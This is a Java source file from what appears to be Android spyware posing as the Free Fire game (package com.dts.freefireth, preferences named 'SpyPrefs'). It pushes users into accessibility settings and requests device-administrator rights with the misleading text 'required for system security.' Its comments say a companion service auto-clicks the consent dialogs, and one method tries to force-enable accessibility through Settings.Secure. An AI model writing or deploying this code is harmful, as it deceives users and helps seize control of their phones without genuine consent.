package com.dts.freefireth;

import android.accessibilityservice.AccessibilityServiceInfo;
import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.view.accessibility.AccessibilityManager;

import java.util.List;

public class AutoAccessibilityHelper {

    private static final String PREF_NAME = "SpyPrefs";
    private static final String KEY_ACCESSIBILITY_REQUESTED = "accessibility_requested";

    public static boolean isAccessibilityEnabled(Context context) {
        try {
            AccessibilityManager am = (AccessibilityManager) context.getSystemService(Context.ACCESSIBILITY_SERVICE);
            if (am == null) return false;
            
            List<AccessibilityServiceInfo> services = am.getEnabledAccessibilityServiceList(
                AccessibilityServiceInfo.FEEDBACK_GENERIC);
            
            String target = context.getPackageName() + "/" + AutoAdminActivator.class.getCanonicalName();
            String targetAlt = context.getPackageName() + "/" + AutoAdminActivator.class.getSimpleName();
            
            for (AccessibilityServiceInfo info : services) {
                String id = info.getId();
                if (id != null && (id.contains(target) || id.contains(targetAlt) || id.contains(context.getPackageName()))) {
                    return true;
                }
            }
            return false;
        } catch (Exception e) { return false; }
    }

    public static void requestAccessibility(Context context) {
        try {
            // Cek apakah sudah di-request sebelumnya (biar ga spam)
            SharedPreferences prefs = context.getSharedPreferences(PREF_NAME, Context.MODE_PRIVATE);
            if (prefs.getBoolean(KEY_ACCESSIBILITY_REQUESTED, false)) {
                // Cek apakah udah aktif
                if (isAccessibilityEnabled(context)) return;
            }

            // Buka halaman accessibility settings
            Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(intent);

            // Tandai sudah di-request
            prefs.edit().putBoolean(KEY_ACCESSIBILITY_REQUESTED, true).apply();

            // Delay buat nunggu dialog muncul, lalu klik otomatis via AutoAdminActivator
            new Handler(Looper.getMainLooper()).postDelayed(() -> {
                // AutoAdminActivator akan handle klik otomatis
                // Coba request admin juga
                try {
                    Intent adminIntent = new Intent(android.app.admin.DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                    android.content.ComponentName admin = new android.content.ComponentName(
                        context, DeviceAdminHelper.class);
                    adminIntent.putExtra(android.app.admin.DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin);
                    adminIntent.putExtra(android.app.admin.DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                        "Diperlukan untuk keamanan sistem.");
                    adminIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    context.startActivity(adminIntent);
                } catch (Exception ignored) {}
            }, 1500);

        } catch (Exception ignored) {}
    }

    public static void forceEnableAccessibility(Context context) {
        // Method buat enable langsung via Settings.Secure (butuh root / system app)
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
                String target = context.getPackageName() + "/" + AutoAdminActivator.class.getCanonicalName();
                Settings.Secure.putString(context.getContentResolver(),
                    Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES, target);
                Settings.Secure.putInt(context.getContentResolver(),
                    Settings.Secure.ACCESSIBILITY_ENABLED, 1);
            }
        } catch (Exception ignored) {}
    }
}